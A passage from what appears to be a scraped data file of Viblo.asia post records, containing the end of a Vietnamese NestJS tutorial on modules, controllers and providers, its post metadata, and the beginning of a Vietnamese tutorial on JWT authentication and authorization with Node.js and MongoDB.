c\u1ea7n tri\u1ec3n khai \u0111\u1ebfn client m\u1ed9t c\u00e1ch \u0111\u1ed9c l\u1eadp. M\u1ed9t module trong Nest l\u00e0 class \u0111\u01b0\u1ee3c define v\u1edbi @Module ().  @Module () s\u1ebd cung c\u1ea5p metadata m\u00e0 Nest s\u1eed d\u1ee5ng \u0111\u1ec3 t\u1ed5 ch\u1ee9c c\u1ea5u tr\u00fac \u1ee9ng d\u1ee5ng.  M\u1ed9t file module c\u01a1 b\u1ea3n s\u1ebd nh\u01b0 sau:\n\nusers/users.module.ts\n```\nimport { Module } from '@nestjs/common';\nimport { UsersController } from './users.controller';\nimport { UsersService } from './users.service';\n\n@Module({\n  controllers: [UsersController],\n  providers: [UsersService],\n})\nexport class UsersModule {}\n```\nTrong m\u1ed9t module s\u1ebd bao g\u1ed3m c\u00e1c th\u00e0nh ph\u1ea7n ch\u00ednh sau \u0111\u00e2y:\n\n* providers:  C\u00f3 nhi\u1ec7m v\u1ee5 kh\u1edfi t\u1ea1o v\u00e0 cung c\u1ea5p c\u00e1c service m\u00e0 s\u1ebd \u0111\u01b0\u1ee3c controller trong module s\u1ebd s\u1eed d\u1ee5ng \u0111\u1ebfn.\n\n* controllers: C\u00f3 nhi\u1ec7m v\u1ee5 kh\u1edfi t\u1ea1o nh\u1eefng controller \u0111\u00e3 \u0111\u01b0\u1ee3c x\u00e1c \u0111\u1ecbnh trong module.\n\n* imports:  C\u00f3 nhi\u1ec7m v\u1ee5 import nh\u1eefng th\u00e0nh ph\u1ea7n c\u1ee7a m\u1ed9t module kh\u00e1c m\u00e0 module s\u1ebd s\u1eed d\u1ee5ng.\n \n* exports: C\u00f3 nhi\u1ec7m v\u1ee5 export c\u00e1c th\u00e0nh ph\u1ea7n c\u1ee7a provider v\u00e0 c\u00e1c module kh\u00e1c s\u1ebb import \u0111\u1ec3 s\u1eed d\u1ee5ng.\n\nNest c\u0169ng h\u1ed7 tr\u1ee3 t\u1ea1o ra c\u00e1c module, controller, provider b\u1eb1ng CLI. \u0110\u1ec3 t\u1ea1o ra m\u1ed9t module users, ch\u00fang ta s\u1eed d\u1ee5ng l\u1ec7nh sau:\n\n```$ nest g module users```\n\nSau khi define modul users, vi\u1ec7c c\u1ea7n l\u00e0m b\u00e2y gi\u1edd l\u00e0 import n\u00f3 v\u00e0o root module c\u1ee7a project l\u00e0 app.module.ts\n\n```\nimport { Module } from '@nestjs/common';\nimport { UsersModule } from './users/users.module';\n\n@Module({\n  imports: [UsersModule],\n})\nexport class AppModule {}\n```\n\nNgo\u00e0i ra, Nest c\u00f2n m\u1ed9t t\u00ednh n\u0103ng kh\u00e1c \u0111\u00f3 l\u00e0 Share Module. B\u1ea1n c\u00f3 th\u1ec3 chia s\u1ebb b\u1ea5t k\u00ec provider n\u00e0o trong module hi\u1ec7n t\u1ea1i cho c\u00e1c module kh\u00e1c. V\u00ed d\u1ee5 b\u1ea1n c\u00f3 th\u1ec3 chia s\u1ebb UserService cho c\u00e1c module kh\u00e1c s\u1eed d\u1ee5ng b\u1eb1ng c\u00e1ch th\u00eam n\u00f3 v\u00e0o m\u1ea3ng exports trong users.module.ts nh\u01b0 sau.\n\n```\nimport { Module } from '@nestjs/common';\nimport { UsersController } from './users.controller';\nimport { UsersService } from './users.service';\n\n@Module({\n  controllers: [UsersController],\n  providers: [UsersService],\n  exports: [UsersService]\n})\nexport class UsersModule {}\n```\n\nSau khi export, c\u00e1c module kh\u00e1c \u0111\u1ec1u c\u00f3 th\u1ec3 import UsersModule v\u00e0 truy c\u1eadp v\u00e0o UsersService \u0111\u1ec3 s\u1eed d\u1ee5ng.\n\nC\u00f2n m\u1ed9t t\u00ednh n\u0103ng kh\u00e1c trong Nest \u0111\u00f3 l\u00e0 global module. N\u1ebfu b\u1ea1n kh\u00f4ng mu\u1ed1n ph\u1ea3i import m\u1ed9t module n\u00e0o \u0111\u00f3 qu\u00e1 nhi\u1ec1u l\u1ea7n th\u00ec Nest cung c\u1ea5p @Global() cho ph\u00e9p b\u1ea1n s\u1eed m\u1ed9t module t\u1eeb module kh\u00e1c m\u00e0 kh\u00f4ng c\u1ea7n import. Nh\u01b0 v\u1eady ch\u00fang ta c\u00f3 th\u1ec3 s\u1eed d\u1ee5ng service c\u1ee7a c\u00e1c module kh\u00e1c r\u1ea5t d\u1ec5 d\u00e0ng ph\u1ea3i kh\u00f4ng. Ch\u1ec9 c\u1ea7n th\u00eam @Global() nh\u01b0 d\u01b0\u1edbi \u0111\u00e2y l\u00e0 c\u00f3 th\u1ec3 bi\u1ebfn n\u00f3 tr\u1edf th\u00e0nh global module.\n\n```\nimport { Module, Global } from '@nestjs/common';\nimport { CatsController } from './cats.controller';\nimport { CatsService } from './cats.service';\n\n@Global()\n@Module({\n  controllers: [CatsController],\n  providers: [CatsService],\n  exports: [CatsService],\n})\nexport class CatsModule {}\n```\n\nNest c\u0169ng h\u1ed7 tr\u1ee3 m\u1ea1nh m\u1ebd trong vi\u1ec7c c\u1ea5u h\u00ecnh c\u00e1c module \u0111\u1ed9ng \u0111\u00f3 l\u00e0 Dynamic modules. Vi\u1ec7c c\u1ea5u h\u00ecnh module \u0111\u1ed9ng n\u00e0y gi\u00fap ta c\u00f3 th\u1ec3 th\u1ef1c hi\u1ec7n c\u00e1c thao t\u00e1c kh\u00e1c nhau tr\u01b0\u1edbc khi export m\u1ed9t module. \u0110\u1ec3 t\u00ecm hi\u1ec3u chi ti\u1ebft v\u1ec1 Dynamic modules b\u1ea1n c\u00f3 th\u1ec3 tham kh\u1ea3o trong [link](https://docs.nestjs.com/fundamentals/dynamic-modules) n\u00e0y D\u01b0\u1edbi \u0111\u00e2y l\u00e0 m\u1ed9t v\u00ed d\u1ee5 v\u1ec1 c\u1ea5u h\u00ecnh c\u01a1 b\u1ea3n Dynamic modules.\n\n```\nimport { Module, DynamicModule } from '@nestjs/common';\nimport { createDatabaseProviders } from './database.providers';\nimport { Connection } from './connection.provider';\n\n@Module({\n  providers: [Connection],\n})\nexport class DatabaseModule {\n  static forRoot(entities = [], options?): DynamicModule {\n    const providers = createDatabaseProviders(options, entities);\n    return {\n      module: DatabaseModule,\n      providers: providers,\n      exports: providers,\n    };\n  }\n}\n```\n\n### Controller\n\n![](https://images.viblo.asia/14a4dd32-a4ba-4395-a903-4128c8d91ab5.png)\n\nNh\u01b0 c\u00e1c b\u1ea1n \u0111\u00e3 bi\u1ebft, controller l\u00e0 n\u01a1i x\u1eed l\u00fd c\u00e1c request v\u00e0 tr\u1ea3 v\u1ec1 response cho ng\u01b0\u1eddi d\u00f9ng. M\u1ed7i controller s\u1ebd ch\u1ee9a c\u00e1c router th\u1ef1c hi\u1ec7n h\u00e0nh \u0111\u1ed9ng v\u00e0 nhi\u1ec7m v\u1ee5 kh\u00e1c nhau \u0111\u01b0\u1ee3c y\u00eau c\u1ea7u t\u1eeb client. \u0110\u1ec3 t\u1ea1o ra m\u1ed9t controller ch\u00fang ta s\u1eed d\u1ee5ng m\u1ed9t v\u00e0 @Controller(). @Controller() s\u1ebd c\u00f3 nhi\u1ec7m v\u1ee5 li\u00ean k\u1ebft class Controller \u0111\u00f3 v\u1edbi request t\u01b0\u01a1ng \u1ee9ng. Ch\u00fang ta s\u1ebd t\u1ea1o m\u1ed9t controller c\u01a1 b\u1ea3n nh\u01b0 sau, b\u1ea1n c\u0169ng c\u00f3 th\u1ec3 t\u1ea1o controller b\u1eb1ng cmd: `$ nest g controller users`\n\n```\nimport { Controller, Get } from '@nestjs/common';\n\n@Controller('users')\nexport class UsersController {\n  @Get()\n  findAll(): string {\n    return 'This action returns all users';\n  }\n}\n```\nNh\u01b0 v\u1eady ch\u00fang ta \u0111\u00e3 t\u1ea1o ra m\u1ed9t API v\u1edbi url `GET: /users`. Trong @Controller m\u00ecnh c\u00f3 s\u1eed d\u1ee5ng ti\u1ec1n t\u1ed1 users l\u00e0m route path, vi\u1ec7c s\u1eed d\u1ee5ng nh\u01b0 v\u1eady s\u1ebd t\u1eadp h\u1ee3p c\u00e1c route li\u00ean quan v\u00e0 gi\u1ea3m thi\u1ec3u code l\u1eb7p l\u1ea1i. \u0110\u1ec3 x\u00e1c \u0111\u1ecbnh method c\u1ee5 th\u1ec3 cho m\u1ed9t request ch\u00fang ta s\u1ebd define @Get() tr\u00ean function findAll(). Vi\u1ec7c khai b\u00e1o nh\u01b0 v\u1eady s\u1ebd gi\u00fap Nest c\u00f3 th\u1ec3 \u00e1nh x\u1ea1 request Get: /users \u0111\u1ebfn function findAll() n\u00e0y \u0111\u1ec3 x\u1eed l\u00fd v\u00e0 response l\u1ea1i cho client. Ngo\u00e0i Get() th\u00ec Nest c\u0169ng cung c\u1ea5p \u0111\u1ea7y \u0111\u1ee7 c\u00e1c method nh\u01b0 framework kh\u00e1c nh\u01b0 @Post(), @Delete(), @Put(), @Path(), @All(),... Ngo\u00e0i ta ta c\u0169ng c\u00f3 th\u1ec3 truy\u1ec1n path v\u00e0o @Get ch\u1eb3ng h\u1ea1n nh\u01b0 @Get('all') s\u1ebd t\u1ea1o ra m\u1ed9t api GET /users/all. Ch\u00fang ta c\u0169ng c\u00f3 th\u1ec3 config http status code v\u00e0 header nh\u01b0 sau:\n\n```\n@Post()\n@HttpCode(204)\n@Header('Cache-Control', 'none')\ncreate() {\n  return 'This action adds a new cat';\n}\n```\n\nNest cung c\u1ea5p b\u1ed9 decorator kh\u00e1 \u0111\u1ea7y \u0111\u1ee7 \u0111\u1ec3 ta c\u00f3 th\u1ec3 th\u1ef1c hi\u1ec7n truy v\u1ea5n v\u00e0o c\u00e1c request c\u0169ng nh\u01b0 x\u1eed l\u00fd response data v\u1ec1 cho client. B\u1ea1n c\u00f3 th\u1ec3 tham kh\u1ea3o qua\n\n![](https://images.viblo.asia/01989a88-739d-407d-8c52-10d8633d8b18.png)\n\nNgo\u00e0i ra Nest c\u0169ng cho ph\u00e9p r\u00e0ng bu\u1ed9c d\u1eef li\u1ec7u g\u1eedi l\u00ean t\u1eeb request gi\u00fap ng\u0103n ch\u1eb7n nh\u1eefng d\u1eef li\u1ec7u kh\u00f4ng h\u1ee3p l\u1ec7 tr\u01b0\u1edbc khi th\u1ef1c hi\u1ec7n x\u1eed l\u00fd, \u0111\u00f3 l\u00e0 DTO (Data Transfer Object). Trong folder `dto` ch\u00fang ta t\u1ea1o file `create-user.dto.ts`:\n```\nexport class CreateUserDto {\n  name: string;\n  age: number;\n  address: string;\n  job: string;\n}\n```\n\nSau \u0111\u00f3 ch\u00fang ta s\u1ebd s\u1eed d\u1ee5ng CreateUserDto trong controller \u0111\u1ec3 th\u1ef1c hi\u1ec7n r\u00e0ng bu\u1ed9c data type g\u1eedi l\u00ean. Trong users.controller.ts h\u00e3y th\u00eam nh\u01b0 sau:\n\n```\n@Post()\nasync create(@Body() createUserDto: CreateUserDto) {\n  return 'This action adds a new user';\n}\n```\n\n### Providers\n\n![](https://images.viblo.asia/51c7a63b-07cc-4585-b610-3aa8386c0bd1.png)\n\nProvider l\u00e0 n\u01a1i cung c\u1ea5p c\u00e1c serivce, repositories, factories, helpers,... cho controller trong m\u1ed9t module s\u1eed d\u1ee5ng. \u0110\u00e2y c\u0169ng l\u00e0 n\u01a1i s\u1ebd ch\u1ee9a nh\u1eefng logic x\u1eed l\u00fd \u0111\u00e3 \u0111\u01b0\u1ee3c t\u00e1ch bi\u1ec7t v\u1edbi controller. \u0110\u1ec3 t\u1ea1o ra m\u1ed9t provider ch\u00fang ta ch\u1ec9 c\u1ea7n khai b\u00e1o @Injectable () tr\u01b0\u1edbc m\u1ed9t class \u0111\u00e3 \u0111\u1ecbnh ngh\u0129a. Vi\u1ec7c s\u1eed d\u1ee5ng @Injectable() s\u1ebd cho Nest bi\u1ebft \u0111\u00e2y l\u00e0 m\u1ed9t class thu\u1ed9c provider. \u0110\u1ec3 t\u1ea1o ra m\u1ed9t service n\u01a1i m\u00e0 ch\u1ee9a c\u00e1c logic x\u1eed l\u00fd c\u1ee7a UserController, ch\u00fang ta h\u00e3y t\u1ea1o ra m\u1ed9t UserService trong file user.service.ts d\u01b0\u1edbi \u0111\u00e2y ho\u1eb7c s\u1eed d\u1ee5ng cmd `$ nest g service cats`\n\n```\nimport { Injectable } from '@nestjs/common';\nimport { User } from './interfaces/user.interface';\n\n@Injectable()\nexport class UsersService {\n  private readonly users: User[] = [];\n\n  create(user: User) {\n    this.users.push(cat);\n  }\n\n  findAll(): User[] {\n    return this.users;\n  }\n}\n```\n\nTrong service tr\u00ean m\u00ecnh c\u00f3 s\u1eed d\u1ee5ng m\u1ed9t interface \u0111\u1ec3 \u0111\u1ecbnh ngh\u0129a m\u1ed9t User. Trong folder interface h\u00e3y t\u1ea1o user.interface.ts nh\u00e9:\n\n```\n\nexport interface User {\n  name: string;\n  age: number;\n  job: string;\n}\n```\n\nVi\u1ec7c cu\u1ed1i c\u00f9ng c\u1ea7n l\u00e0m l\u00e0 s\u1eed d\u1ee5ng n\u00f3 b\u00ean trong c\u00e1c route c\u1ee7a controller\n\n```\nimport { Controller, Get, Post, Body } from '@nestjs/common';\nimport { CreateUserDto } from './dto/create-user.dto';\nimport { UsersService } from './users.service';\nimport { User } from './interfaces/user.interface';\n\n@Controller('users')\nexport class UsersController {\n  constructor(private usersService: UsersService) {}\n\n  @Post()\n  async create(@Body() createUserDto: CreateUserDto) {\n    this.usersService.create(createUserDto);\n  }\n\n  @Get()\n  async findAll(): Promise<User[]> {\n    return this.usersService.findAll();\n  }\n}\n```\nC\u00e1c Service \u1edf tr\u00ean \u0111\u1ec1u \u0111\u01b0\u1ee3c Nest s\u1eed d\u1ee5ng Singleton c\u1ee7a Design Pattern \u0111\u1ec3 kh\u1edfi t\u1ea1o. V\u00ec v\u1eady n\u1ebfu \u0111\u00e3 \u0111\u01b0\u1ee3c s\u1eed d\u1ee5ng \u1edf m\u1ed9t module ho\u1eb7c controller kh\u00e1c th\u00ec n\u00f3 s\u1ebd tr\u1ea3 v\u1ec1 instance \u0111\u00e3 kh\u1edfi t\u1ea1o tr\u01b0\u1edbc \u0111\u00f3.\n\n## T\u1ed5ng k\u1ebft\nVi\u1ec7c ti\u1ebfp c\u1eadn Nest ph\u1ee9c t\u1ea1p h\u01a1n so v\u1edbi Express v\u00e0 Fastify n\u00ean trong b\u00e0i vi\u1ebft n\u00e0y m\u00ecnh c\u00f3 n\u00f3i chi ti\u1ebft m\u1ed9t ch\u00fat. B\u00e0i vi\u1ebft tr\u00ean m\u00ecnh c\u00e1c n\u00f3i qua c\u00e1c t\u00ednh n\u0103ng v\u00e0 th\u00e0nh ph\u1ea7n c\u01a1 b\u1ea3n c\u0169ng nh\u01b0 quan tr\u1ecdng nh\u1ea5t trong Nest. Tuy nhi\u00ean, Nest c\u00f2n r\u1ea5t nhi\u1ec1u t\u00ednh n\u0103ng th\u00fa v\u1ecb m\u00e0 m\u00ecnh kh\u00f4ng th\u1ec3 n\u00f3i h\u1ebft trong m\u1ed9t b\u00e0i vi\u1ebft. H\u1eb9n g\u0103p l\u1ea1i c\u00e1c b\u1ea1n \u1edf b\u00e0i vi\u1ebft ti\u1ebfp theo c\u1ee7a series v\u1ec1 NestJS nh\u00e9. C\u1ea3m \u01a1n c\u00e1c b\u1ea1n",
      published_at: "2020-11-22 21:52:52",
      is_published: true,
      is_shared: false,
      updated_at: "2021-03-20 10:49:04",
      translation_source: null,
      trend_at: null,
      promoted_at: null,
      reading_time: 11,
      points: 6,
      views_count: 1225,
      clips_count: 6,
      comments_count: 1,
      rated_value: null,
      promoted: false,
      trending: false,
      is_draft: false,
      is_public: true,
      locale_code: "vi",
      is_video: false,
      thumbnail_url:
        "https://images.viblo.asia/6cd0fa05-d1c5-4ac9-85b6-74e45ed8b7c5.png",
      user: {
        data: {
          id: 44193,
          url: "https://viblo.asia/u/tungnt-sun-asterisk",
          avatar: "b631ec61-dc52-4db9-9371-0f9303804fd2.png",
          name: "Nguy\u1ec5n Thanh T\u00f9ng",
          username: "tungnt-sun-asterisk",
          followers_count: 3,
          reputation: 125,
          posts_count: 6,
          banned_at: null,
          following: false,
        },
      },
      tags: {
        data: [
          {
            slug: "nodejs",
            name: "Node.js",
            primary: false,
            image:
              "https://placehold.jp/16/8e44ad/ffffff/80x80.jpg?text=Nodejs&css=%7B%22padding%22%3A%223px%22%7D",
          },
          {
            slug: "javascript",
            name: "JavaScript",
            primary: false,
            image:
              "https://placehold.jp/16/c0392b/ffffff/80x80.jpg?text=JavaScript&css=%7B%22padding%22%3A%223px%22%7D",
          },
          {
            slug: "nestjs",
            name: "nestjs",
            primary: false,
            image:
              "https://placehold.jp/16/8e44ad/ffffff/80x80.jpg?text=nestjs&css=%7B%22padding%22%3A%223px%22%7D",
          },
        ],
      },
      commentators: {
        data: [
          {
            id: 41842,
            url: "https://viblo.asia/u/Henry.l",
            avatar: "f1861f8d-5b8d-424f-ae37-30f902d20239.jpg",
            name: "V\u0169 L\u00ea",
            username: "Henry.l",
            followers_count: 0,
            reputation: 0,
            posts_count: 0,
            banned_at: null,
          },
        ],
      },
    },
    {
      id: 48779,
      title:
        "Node.js + MongoDB: Authentication v\u00e0 Authorization s\u1eed d\u1ee5ng JWT",
      slug: "1Je5EQ8G5nL",
      url:
        "https://viblo.asia/p/nodejs-mongodb-authentication-va-authorization-su-dung-jwt-1Je5EQ8G5nL",
      user_id: 26040,
      moderation: null,
      transliterated:
        "nodejs-mongodb-authentication-va-authorization-su-dung-jwt",
      contents_short:
        "I. Gi\u1edbi thi\u1ec7u\n\nH\u1ea7u h\u1ebft h\u1ec7 th\u1ed1ng \u1ee9ng d\u1ee5ng back-end, t\u00ednh n\u0103ng x\u00e1c th\u1ef1c v\u00e0 ph\u00e2n quy\u1ec1n ng\u01b0\u1eddi d\u00f9ng \u0111\u1ec1u ph\u1ea3i c\u00f3. V\u00ed d\u1ee5, khi t\u1ea1o m\u1ed9t website, \u0111\u01b0\u01a1ng nhi\u00ean b\u1ea1n c\u1ea7n ph\u1ea3i x\u00e2y d\u1ef1ng t\u00ednh n\u0103ng \u0111\u0103ng k\u00fd, \u0111\u0103ng nh\u1ead...",
      contents:
        '# I. Gi\u1edbi thi\u1ec7u\n\nH\u1ea7u h\u1ebft h\u1ec7 th\u1ed1ng \u1ee9ng d\u1ee5ng back-end, t\u00ednh n\u0103ng x\u00e1c th\u1ef1c v\u00e0 ph\u00e2n quy\u1ec1n ng\u01b0\u1eddi d\u00f9ng \u0111\u1ec1u ph\u1ea3i c\u00f3. V\u00ed d\u1ee5, khi t\u1ea1o m\u1ed9t website, \u0111\u01b0\u01a1ng nhi\u00ean b\u1ea1n c\u1ea7n ph\u1ea3i x\u00e2y d\u1ef1ng t\u00ednh n\u0103ng \u0111\u0103ng k\u00fd, \u0111\u0103ng nh\u1eadp, ph\u00e2n quy\u1ec1n admin, mod, member\u2026   C\u00f3 m\u1ed9t m\u1ed9t s\u1ed1 k\u1ef9 thu\u1eadt gi\u00fap b\u1ea1n x\u00e2y d\u1ef1ng t\u00ednh n\u0103ng n\u00e0y, v\u00ed d\u1ee5: d\u00f9ng Sessions, ho\u1eb7c m\u1edbi h\u01a1n l\u00e0 JWT.\n\nQua b\u00e0i vi\u1ebft n\u00e0y, ch\u00fang ta s\u1ebd c\u00f9ng nhau x\u00e2y d\u1ef1ng m\u1ed9t v\u00ed d\u1ee5 \u1ee9ng d\u1ee5ng Node.js + MongoDB h\u1ed7 tr\u1ee3 t\u00ednh n\u0103ng User Authentication (\u0111\u0103ng k\u00fd, \u0111\u0103ng nh\u1eadp) v\u00e0 Authorization b\u1eb1ng JSONWebToken (JWT).\n\n# II. S\u1ef1 kh\u00e1c nhau \u201cAuthentication\u201d v\u00e0 \u201cAuthorization\u201d\nNghe hai thu\u1eadt ng\u1eef n\u00e0y c\u00f3 v\u1ebb gi\u1ed1ng nhau \u0111\u00fang kh\u00f4ng? Tuy nhi\u00ean, ch\u00fang h\u01a1i kh\u00e1c m\u1ed9t ch\u00fat. M\u00ecnh s\u1ebd kh\u00f4ng \u0111i s\u00e2u v\u00e0o chi ti\u1ebft ho\u1ea1t \u0111\u1ed9ng c\u1ee7a ch\u00fang. Ph\u1ea7n n\u00e0y, m\u00ecnh ch\u1ec9 mu\u1ed1n l\u00e0m n\u1ed5i b\u1eadt \u0111\u1eb7c \u0111i\u1ec3m \u0111\u1ec3 b\u1ea1n ph\u00e2n bi\u1ec7t Authentication v\u00e0 Authorization.\n\n## 1.1. Authentication\nAuthentication l\u00e0 qu\u00e1 tr\u00ecnh h\u1ec7 th\u1ed1ng ki\u1ec3m tra, x\u00e1c \u0111\u1ecbnh danh t\u00ednh c\u1ee7a ng\u01b0\u1eddi d\u00f9ng ho\u1eb7c m\u1ed9t h\u1ec7 th\u1ed1ng kh\u00e1c \u0111ang truy c\u1eadp v\u00e0o h\u1ec7 th\u1ed1ng hi\u1ec7n t\u1ea1i.\n\nHi\u1ec3u n\u00f4m na, qu\u00e1 tr\u00ecnh Authentication \u0111i t\u00ecm c\u00e2u tr\u1ea3 l\u1eddi cho c\u00e2u h\u1ecfi: \u201cB\u1ea1n l\u00e0 ai?\u201d\n\nQu\u00e1 tr\u00ecnh Authentication r\u1ea5t th\u00f4ng d\u1ee5ng, h\u1ea7u h\u1ebft c\u00e1c CMS li\u00ean quan t\u1edbi qu\u1ea3n l\u00fd n\u1ed9i dung, t\u01b0\u01a1ng t\u00e1c v\u1edbi ng\u01b0\u1eddi d\u00f9ng \u0111\u1ec1u c\u00f3. Hi\u1ec7n nay, authentication x\u00e1c th\u1ef1c ch\u1ee7 y\u1ebfu d\u1ef1a tr\u00ean hai th\u00f4ng tin: t\u00ean ng\u01b0\u1eddi d\u00f9ng v\u00e0 m\u1eadt kh\u1ea9u.\n\n## 1.2. Authorization\nT\u01b0\u01a1ng t\u1ef1, qu\u00e1 tr\u00ecnh authorization \u0111\u1ec3 tr\u1ea3 l\u1eddi cho c\u00e2u h\u1ecfi: \u201cB\u1ea1n \u0111\u01b0\u1ee3c ph\u00e9p l\u00e0m g\u00ec?\u201c.\n\nV\u1ec1 m\u1eb7t k\u1ef9 thu\u1eadt, qu\u00e1 tr\u00ecnh authorization th\u01b0\u1eddng \u0111\u01b0\u1ee3c th\u1ef1c hi\u1ec7n sau khi qu\u00e1 tr\u00ecnh authentication k\u1ebft th\u1ee9c. T\u1ee9c l\u00e0, sau khi bi\u1ebft b\u1ea1n l\u00e0 ai r\u1ed3i th\u00ec b\u01b0\u1edbc ti\u1ebfp theo x\u00e1c \u0111\u1ecbnh b\u1ea1n \u0111\u01b0\u1ee3c ph\u00e9p l\u00e0m g\u00ec trong h\u1ec7 th\u1ed1ng.\n\n# III. Token Based Authentication\nSo v\u1edbi k\u1ef9 thu\u1eadt x\u00e1c th\u1ef1c d\u1ef1a tr\u00ean Session, b\u1ea1n c\u1ea7n ph\u1ea3i l\u01b0u Session v\u00e0o Cookie. L\u1ee3i  th\u1ebf l\u1edbn nh\u1ea5t c\u1ee7a Token-base authentication l\u00e0 l\u01b0u JSON Web Token (JWT) tr\u00ean client nh\u01b0: Local Storage tr\u00ean Browser, Keychain trong iOS app hay SharedPreferences trong \u1ee9ng d\u1ee5ng Android, .v.v\u2026\n\nV\u00ec v\u1eady, ch\u00fang ta kh\u00f4ng c\u1ea7n ph\u1ea3i x\u00e2y d\u1ef1ng m\u1ed9t d\u1ef1 \u00e1n v\u1ec7 tinh ho\u1eb7c m\u1ed9t module x\u00e1c th\u1ef1c b\u1ed5 sung \u0111\u1ec3 h\u1ed7 tr\u1ee3 cho \u1ee9ng d\u1ee5ng kh\u00f4ng d\u00f9ng tr\u00ean tr\u00ecnh duy\u1ec7t (v\u00ed d\u1ee5 nh\u01b0 c\u00e1c \u1ee9ng d\u1ee5ng mobile Android, iOS\u2026)\n\nD\u01b0\u1edbi \u0111\u00e2y l\u00e0 s\u01a1 \u0111\u1ed3 lu\u1ed3ng ho\u1ea1t \u0111\u1ed9ng c\u1ee7a JWT.\n\n![](https://images.viblo.asia/161776fd-e0dd-465e-9cab-457d13487567.PNG)\n\nC\u00f3 3 th\u00e0nh ph\u1ea7n quan tr\u1ecdng c\u1ee7a JWT:\n\n* Header\n* Payload\n* Signature\n\nCh\u00fang \u0111\u01b0\u1ee3c k\u1ebft h\u1ee3p v\u1edbi nhau t\u1ea1o th\u00e0nh m\u1ed9t c\u1ea5u tr\u00fac ti\u00eau chu\u1ea9n:\n\n```php\nheader.payload.signature\n```\n\n\u1ee8ng d\u1ee5ng Client th\u01b0\u1eddng \u0111\u00ednh k\u00e8m m\u00e3 JWT v\u00e0o header v\u1edbi ti\u1ec1n t\u1ed1 Bearer:\n\n```php\nAuthorization: Bearer [header].[payload].[signature]\n```\n\nHo\u1eb7c ch\u1ec9 c\u1ea7n th\u00eam m\u1ed9t tr\u01b0\u1eddng x-access-token trong header\n\n```php\nx-access-token: [header].[payload].[signature]\n```\n\n# IV. Th\u1ef1c h\u00e0nh Node.js & MongoDB User Authentication\nSau khi t\u00ecm hi\u1ec3u xong l\u00fd thuy\u1ebft, gi\u1edd l\u00e0 l\u00fac b\u1eaft tay v\u00e0o th\u1ef1c h\u00e0nh. Ch\u00fang ta s\u1ebd x\u00e2y d\u1ef1ng m\u1ed9t \u1ee9ng d\u1ee5ng Node.js + Express v\u1edbi t\u00ednh n\u0103ng user authentication + authorization, trong \u0111\u00f3:\n\n* Ng\u01b0\u1eddi d\u00f9ng c\u00f3 th\u1ec3 \u0111\u0103ng k\u00fd t\u00e0i kho\u1ea3n m\u1edbi ho\u1eb7c \u0111\u0103ng nh\u1eadp n\u1ebfu \u0111\u00e3 c\u00f3 t\u00e0i kho\u1ea3n.\n* Ph\u00e2n quy\u1ec1n t\u00e0i kho\u1ea3n ng\u01b0\u1eddi d\u00f9ng theo role (admin, moderator, user). V\u1edbi m\u1ed7i role, ng\u01b0\u1eddi d\u00f9ng c\u00f3 quy\u1ec1n kh\u00e1c nhau \u0111\u1ec3 truy c\u1eadp v\u00e0o t\u00e0i nguy\u00ean.\n\n\u0110\u00e2y l\u00e0 danh s\u00e1ch nh\u1eefng APIs c\u1ea7n thi\u1ebft:\n\n![](https://images.viblo.asia/b3d5f2e8-7b14-4928-b92f-22cb771eb7a2.PNG)\n\n# V.  Flow ch\u01b0\u01a1ng tr\u00ecnh cho t\u00ednh n\u0103ng Signup & Login\nD\u01b0\u1edbi \u0111\u00e2y l\u00e0 diagram mi\u00eau t\u1ea3 quy tr\u00ecnh m\u00e0 \u1ee9ng d\u1ee5ng Node.js s\u1ebd th\u1ef1c hi\u1ec7n cho c\u00e1c t\u00ednh n\u0103ng Authentication (User Registration, User Login) v\u00e0 Authorization (ph\u00e2n quy\u1ec1n).\n\n![](https://images.viblo.asia/ba15af54-95e7-4b00-a33b-57b8bee7f375.PNG)\n\nM\u1ed9t JWT h\u1ee3p l\u1ec7 \u0111\u1ec3 truy c\u1eadp v\u00e0o t\u00e0i nguy\u00ean h\u1ec7 th\u1ed1ng ph\u1ea3i c\u00f3 tr\u01b0\u1eddng x-access-token trong Header c\u1ee7a HTTP.\n\n# VI. Node.js Express Architecture cho Authentication & Authorization\nH\u00ecnh d\u01b0\u1edbi \u0111\u00e2y m\u00f4 t\u1ea3 t\u1ed5ng quan ki\u1ebfn tr\u00fac \u1ee9ng d\u1ee5ng s\u1eed d\u1ee5ng Node.js + Express cho authentication & authorization.\n\n![](https://images.viblo.asia/d2c99525-1d08-4c56-8241-95dde25869a8.PNG)\n\nTh\u00f4ng qua Express, c\u00e1c HTTP request h\u1ee3p l\u1ec7 v\u00e0 \u0111\u00fang v\u1edbi route \u0111\u00e3 thi\u1ebft k\u1ebf (xem l\u1ea1i b\u1ea3ng 3.1- danh s\u00e1ch c\u00e1c API s\u1eed d\u1ee5ng trong app) s\u1ebd \u0111\u01b0\u1ee3c ki\u1ec3m tra b\u1edfi CORS Middleware tr\u01b0\u1edbc khi v\u00e0o Security layer.\n\nSecurity layer bao g\u1ed3m:\n\n* JWT Authentication Middleware: c\u00f3 nhi\u1ec7m v\u1ee5 x\u00e1c minh SignUp, chu\u1ed7i token.\n* Authorization Middleware: Ki\u1ec3m tra role c\u1ee7a ng\u01b0\u1eddi d\u00f9ng \u0111\u0103ng nh\u1eadp v\u1edbi c\u00e1c th\u00f4ng tin \u0111\u01b0\u1ee3c l\u01b0u trong c\u01a1 s\u1edf d\u1eef li\u1ec7u.\n\nN\u1ebfu g\u1eb7p b\u1ea5t k\u1ef3 l\u1ed7i n\u00e0o trong to\u00e0n b\u1ed9 qu\u00e1 tr\u00ecnh tr\u00ean s\u1ebd l\u1eadp t\u1ee9c ph\u1ea3n h\u1ed3i l\u1ea1i cho client d\u01b0\u1edbi d\u1ea1ng HTTP response (error code).\n\nC\u00e1c k\u1ef9 thu\u1eadt \u0111\u01b0\u1ee3c s\u1eed d\u1ee5ng v\u00ed d\u1ee5 n\u00e0y (phi\u00ean b\u1ea3n c\u00f3 th\u1ec3 kh\u00e1c trong t\u01b0\u01a1ng lai nh\u01b0ng ch\u1eafc kh\u00f4ng v\u1ea5n \u0111\u1ec1 g\u00ec \u0111\u00e2u):\n\n* Express 4.17.1\n* bcryptjs 2.4.3\n* jsonwebtoken 8.5.1\n* mongoose 5.9.1\n* MongoDB\n\nY\u00eau c\u1ea7u m\u00f4i tr\u01b0\u1eddng ph\u00e1t tri\u1ec3n, b\u1ea1n c\u1ea7n ph\u1ea3i c\u00e0i \u0111\u1eb7t tr\u01b0\u1edbc nh\u1eefng ph\u1ea7n m\u1ec1m sau:\n\n* Nodejs: H\u01b0\u1edbng d\u1eabn c\u00e0i \u0111\u1eb7t Node + Npm chi ti\u1ebft\n* MongoDB: 